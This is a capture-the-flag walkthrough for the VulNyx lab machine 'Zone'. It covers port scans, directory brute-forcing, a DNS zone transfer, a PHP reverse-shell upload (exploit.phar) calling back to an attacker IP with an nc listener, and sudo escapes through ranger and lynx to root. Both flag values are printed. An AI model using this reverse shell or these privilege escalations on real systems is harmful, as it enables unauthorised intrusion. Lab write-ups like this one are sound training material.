# VulNyx - Zone

## Information

## Solution

### Enumeration
#### Nmap Discovery
```bash
┌──(dungcngo㉿kali)-[~]
└─$ nmap -sVC -p- -T4 10.11.5.31
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-28 06:58 +07
Nmap scan report for 10.11.5.31
Host is up (0.00095s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f7:ea:48:1a:a3:46:0b:bd:ac:47:73:e8:78:25:af:42 (RSA)
|   256 2e:41:ca:86:1c:73:ca:de:ed:b8:74:af:d2:06:5c:68 (ECDSA)
|_  256 33:6e:a2:58:1c:5e:37:e1:98:8c:44:b1:1c:36:6d:75 (ED25519)
53/tcp open  domain  Eero device dnsd
| dns-nsid: 
|_  bind.version: not currently available
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:16:E9:6C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; Device: WAP; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.15 seconds
```
![web](/walkthroughs/vulnyx/easy_difficulty/07_zone/web.png)

#### Directory Enumeration
```bash
┌──(dungcngo㉿kali)-[~]
└─$ feroxbuster -u http://10.11.5.31/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
                                                                                     
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.11.5.31/
 🚩  In-Scope Url          │ 10.11.5.31
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       24l      126w    10353c http://10.11.5.31/icons/openlogo-75.png
200      GET      367l      933w    10700c http://10.11.5.31/
[####################] - 78s   220550/220550  0s      found:2       errors:0      
[####################] - 78s   220545/220545  2846/s  http://10.11.5.31/   
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.31/ -w /usr/share/wordlists/dirb/common.txt -x html,txt,php
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.31/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta.html            (Status: 403) [Size: 275]
/.hta.php             (Status: 403) [Size: 275]
/.hta                 (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.hta.txt             (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10700]
/index.html           (Status: 200) [Size: 10700]
/robots.txt           (Status: 200) [Size: 67]
/robots.txt           (Status: 200) [Size: 67]
/server-status        (Status: 403) [Size: 275]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```

![web robots.txt](/walkthroughs/vulnyx/easy_difficulty/07_zone/robots-web.png)

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ echo "10.11.5.31 securezone.nyx" | sudo tee -a /etc/hosts
[sudo] password for dungcngo: 
10.11.5.31 securezone.nyx

┌──(dungcngo㉿kali)-[/tmp]
└─$ cat /etc/hosts | grep securezone.nyx
10.11.5.31 securezone.nyx

┌──(dungcngo㉿kali)-[/tmp]
└─$ dig axfr securezone.nyx @10.11.5.31

; <<>> DiG 9.20.15-2-Debian <<>> axfr securezone.nyx @10.11.5.31
;; global options: +cmd
securezone.nyx.         604800  IN      SOA     ns1.securezone.nyx. root.securezone.nyx. 2 604800 86400 2419200 604800
securezone.nyx.         604800  IN      NS      ns1.securezone.nyx.
admin.securezone.nyx.   604800  IN      A       127.0.0.1
ns1.securezone.nyx.     604800  IN      A       127.0.0.1
upl0ads.securezone.nyx. 604800  IN      A       127.0.0.1
www.securezone.nyx.     604800  IN      A       127.0.0.1
securezone.nyx.         604800  IN      SOA     ns1.securezone.nyx. root.securezone.nyx. 2 604800 86400 2419200 604800
;; Query time: 4 msec
;; SERVER: 10.11.5.31#53(192.168.100.117) (TCP)
;; WHEN: Tue Jun 09 17:14:30 +07 2026
;; XFR size: 7 records (messages 1, bytes 248)

┌──(dungcngo㉿kali)-[/tmp]
└─$ cat /etc/hosts | grep securezone.nyx
10.11.5.31 securezone.nyx admin.securezone.nyx upl0ads.securezone.nyx
```
![upload-web](/walkthroughs/vulnyx/easy_difficulty/07_zone/upload-web.png)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://upl0ads.securezone.nyx/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://upl0ads.securezone.nyx/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 287]
/.htaccess            (Status: 403) [Size: 287]
/.htpasswd            (Status: 403) [Size: 287]
/css                  (Status: 301) [Size: 330] [--> http://upl0ads.securezone.nyx/css/]                                                                
/index.php            (Status: 200) [Size: 525]
/server-status        (Status: 403) [Size: 287]
/uploads              (Status: 301) [Size: 334] [--> http://upl0ads.securezone.nyx/uploads/]                                                            
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```


### Initial Access
#### Shell (www-data)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ cat exploit.phar              
<?php
$sock = fsockopen("10.11.5.4", 4444);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>

┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...

```
![exploit-web](/walkthroughs/vulnyx/easy_difficulty/07_zone/exploit-web.png)

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.100.172] from (UNKNOWN) [192.168.100.117] 46394
/bin/sh: 0: can't access tty; job control turned off
$ id ; hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
zone
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@zone:/var/www/site/uploads$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                            
┌──(dungcngo㉿kali)-[/tmp]
└─$ stty raw -echo; fg  
[1]  + continued  nc -lvnp 4444
                               export SHELL=bash
www-data@zone:/var/www/site/uploads$ export TERM=xterm-256color
www-data@zone:/var/www/site/uploads$ reset
```

#### Shell (hans)
##### Enumeration
```bash
www-data@zone:/var/www/site/uploads$ cd /
www-data@zone:/$ ls
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var
www-data@zone:/$ cd usr
www-data@zone:/usr$ ls
bin  games  include  lib  lib32  lib64  libx32  local  sbin  share  src
www-data@zone:/usr$ sudo -l
Matching Defaults entries for www-data on zone:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on zone:
    (hans) NOPASSWD: /usr/bin/ranger
```
##### Shell
![ranger-exploit](/walkthroughs/vulnyx/easy_difficulty/07_zone/ranger.png)

```bash
www-data@zone:/$ sudo -u hans /usr/bin/ranger
/bin/bash: S: command not found
da95d973ced23c4a38c47a5b4c7a8ab5
/bin/bash: shell: command not found
hans@zone:~$ id; hostname
uid=1000(hans) gid=1000(hans) groups=1000(hans)
zone
```
#### Flag
```bash
hans@zone:~$ cat user.txt
da95d973ced23c4a38c47a5b4c7a8ab5
```

### Privilege Escalation
#### Enumeration
```bash
hans@zone:~$ sudo -l
Matching Defaults entries for hans on zone:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User hans may run the following commands on zone:
    (root) NOPASSWD: /usr/bin/lynx
```

#### Abuse
After run the following command, we press the `!`:
```bash
hans@zone:~$ sudo /usr/bin/lynx http://localhost
Spawning your default shell.  Use 'exit' to return to Lynx.

root@zone:/home/hans# cd /
root@zone:/# ls
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var
root@zone:/# cd 
root@zone:~# ls
root.txt
```
#### Flag 
```bash
root@zone:~# cat root.txt 
63b45f07f0c3a693f2acea8438f68fc1
```

***You're welcome!***
